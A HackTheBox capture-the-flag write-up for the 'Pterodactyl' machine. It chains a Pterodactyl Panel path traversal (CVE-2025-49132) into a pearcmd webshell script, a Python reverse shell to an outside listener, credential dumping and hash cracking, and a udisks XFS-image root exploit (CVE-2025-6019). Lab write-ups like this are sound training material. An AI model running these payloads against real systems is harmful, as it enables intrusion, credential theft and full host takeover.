---
title: Pterodactyl - HTB
date: 2026-02-07
categories: [WriteUps, HTB]
tags: [HTB, linux, web, privesc, LFI]
image:
  base: /assets/img/posts/htb/pterodactyl
active: false
difficulty: medium
os: linux
description: "Pterodactyl is the 2nd machine of HackTheBox Season 10."
pawned: root
---

## Scan

Standard TCP scan reveals ports 22 and 80. Port 80 redirects to `pterodactyl.htb`.

```bash
echo '10.129.2.195 panel.pterodactyl.htb pterodactyl.htb' | sudo tee -a /etc/hosts
```

---

## Foothold

### Subdomain Enumeration

```bash
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FHOST \
  -u http://pterodactyl.htb/ -H 'Host: FHOST.pterodactyl.htb' -t 100 -fs 145
# panel  [Status: 200]
```

`panel.pterodactyl.htb` runs **Pterodactyl Panel**.

### CVE-2025-49132 — Config File Disclosure (LFI)

The panel is vulnerable to [CVE-2025-49132](https://www.exploit-db.com/exploits/52341), a path traversal in the locale endpoint that leaks Laravel config files:

```bash
# Leak database credentials
curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database'
```

```json
"username": "pterodactyl",
"password": "PteraPanel"
```

```bash
# Leak app key (needed for RCE)
curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app'
```

```json
"key": "base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY="
```

### RCE via pearcmd PHP File Write

Direct Laravel deserialization with the app key didn't yield execution. Instead, we exploit the PEAR `config-create` trick ([reference](https://w41bu1.github.io/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/)) to write a PHP webshell via the same locale LFI endpoint.

The exploit makes two requests: first to write a PHP file via pearcmd, then to include and execute it:

```python
# exploit_pearcmd.py
import sys, os

host = sys.argv[1]
payload = sys.argv[2].replace(' ', '\\$\\\\{IFS\\\\}')
os.system(f"curl \"http://{host}/locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('{payload}')?>+/tmp/payload.php\"")
os.system(f"curl \"http://{host}/locales/locale.json?locale=../../../../../tmp&namespace=payload\"")
```

Prepare a base64-encoded reverse shell to avoid special character issues:

```bash
CMD='python3.6 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.147\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"'
B64=$(echo -n "$CMD" | base64 -w0)
```

Start a listener and trigger the shell:

```bash
rlwrap nc -nlvp 4444 -s 10.10.16.147

python3 exploit_pearcmd.py panel.pterodactyl.htb "echo ${B64} | base64 -d | bash"
```

```bash
uid=65534(wwwrun) gid=65534(wwwrun) groups=65534(wwwrun)
```

---

## User

### Database Dump

With the credentials from CVE-2025-49132, connect to MariaDB and dump users:

```bash
mysql -h 127.0.0.1 -u pterodactyl -p'PteraPanel' panel \
  -e "SELECT username, password FROM users;"
```

```
headmonitor  $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
phileasfogg3 $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
```

### Crack bcrypt Hashes

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
# $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
```

```bash
ssh phileasfogg3@pterodactyl.htb
# Password: !QAZ2wsx
```

User flag is in `/home/phileasfogg3`:

```bash
phileasfogg3@pterodactyl:~> cat user.txt
```

---

## Root

### Recon — udisks Hint

A mail in `/var/spool/mail/phileasfogg3` from `headmonitor` flags unusual activity from `udisksd`:

```
Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
Unusual activity has been observed from the udisks daemon (udisksd).
Do not connect untrusted external media...
```

Checking the installed version:

```bash
rpm -qa | grep udisks
# udisks2-2.9.2-150400.3.3.1.x86_64
```

### CVE-2025-6019 — udisks LPE via XFS Image

`udisks2 2.9.2` is vulnerable to [CVE-2025-6019](https://ubuntu.com/security/CVE-2025-6019) — a local privilege escalation via malicious XFS image mount triggered through PolicyKit. The `allow_active: yes` policy on `org.freedesktop.udisks2.modify-device` allows any active session user to trigger it without authentication.

**Step 1:** Generate the XFS image locally (requires root):

```bash
git clone https://github.com/guinea-offensive-security/CVE-2025-6019
cd CVE-2025-6019

# Fix mkfs.xfs path before running (not in $PATH on target):
# Change deps array line: "mkfs.xfs" → "/sbin/mkfs.xfs"

sudo ./exploit.sh
# Select [L]ocal → creates xfs.image (300MB)
```

**Step 2:** Transfer to target:

```bash
scp xfs.image phileasfogg3@pterodactyl.htb:/tmp/CVE-2025-6019/
```

**Step 3:** Run the exploit on target:

```bash
./exploit.sh
# Select [C]ible
```

```bash
[+] SUID bash found: /tmp/blockdev.S8XIK3/bash
bash-5.2# whoami
root

bash-5.2# cat /root/root.txt
```